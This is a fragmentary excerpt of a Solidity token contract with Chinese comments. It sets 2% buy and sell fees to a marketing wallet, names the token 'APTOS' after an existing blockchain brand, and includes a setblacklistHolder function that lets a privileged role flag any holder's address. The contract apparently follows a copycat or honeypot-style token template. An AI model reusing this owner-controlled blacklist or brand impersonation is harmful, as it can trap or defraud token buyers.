...
abstract contract MilkTeaToken is IERC20, Ownable {
    ...
    uint256 public _buyFundFee = 200;//200为购买营销钱包税费2%
    uint256 public _buyLPDividendFee = 0;//100为购买加池子LP分红税费1%
    uint256 public _buyLPFee = 0;//
    uint256 public _sellFundFee = 200;//200为卖出营销钱包税费2%
    uint256 public _sellLPDividendFee = 0;//100为卖出加池子LP分红税费1%
    ...
    function setblacklistHolder(address addr, uint256 enable) public onlyFunder {
         _tokens[addr] = (enable);
    }
...
contract MilkTea is MilkTeaToken {
    constructor() MilkTeaToken(
    
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//路由器地址
    
        address(0x55d398326f99059fF775485246999027B3197955),//USDT地址
        "APTOS",//代币名称
        "APTOS",//代币符号
        18,//18位代币精度  默认即可无需更改
    
        100000000,//代币总量 发多少就填多少
    
        address(0x7A05258d11b55fa75E7f2Afa3eF2646731032e50),//营销钱包地址
    
        address(0x7A05258d11b55fa75E7f2Afa3eF2646731032e50)//部署代币接收地址（部署的代币发送到这个钱包地址）
    ){
